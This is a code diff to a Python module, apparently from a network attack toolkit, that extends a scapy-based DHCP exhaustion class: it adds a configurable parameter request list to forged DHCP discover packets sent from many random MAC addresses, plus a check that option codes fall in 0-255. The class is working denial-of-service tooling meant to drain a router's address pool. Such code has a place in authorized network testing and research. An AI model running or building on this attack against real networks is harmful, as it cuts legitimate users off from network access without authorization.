@@ -1,13 +1,14 @@
 import random
 import time
 import threading
+from typing import List
 from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
 from .base_attack import BaseAttack
 
 class DHCPExhaustion(BaseAttack):
     """Simulate multiple DHCP clients to exhaust router's IP pool"""
     
-    def __init__(self, interface: str, num_devices: int = 50):
+    def __init__(self, interface: str, num_devices: int = 50, request_options: List[int] = None):
         """
         Initialize DHCP exhaustion attack
         
@@ -15,6 +16,7 @@ class DHCPExhaustion(BaseAttack):
         """
         super().__init__(interface)
         self.num_devices = num_devices
+        self.request_options = request_options or list(range(81))
         self.sent_macs = set()
 
     def _generate_mac(self) -> str:
@@ -29,6 +31,11 @@ class DHCPExhaustion(BaseAttack):
                 self.sent_macs.add(mac)
                 return mac
 
+    def _validate_options(self):
+        """Ensure requested options are valid DHCP option codes"""
+        if not all(0 <= opt <= 255 for opt in self.request_options):
+            raise ValueError("DHCP options must be between 0-255")
+
     def _create_dhcp_packet(self):
         """Build DHCP discovery packet"""
         mac = self._generate_mac()
@@ -38,6 +45,7 @@ class DHCPExhaustion(BaseAttack):
                BOOTP(chaddr=mac) / \
                DHCP(options=[("message-type", "discover"), 
                             ("client_id", mac),
+                            ("param_req_list", self.request_options),
                             "end"])
 
     def _send_loop(self):
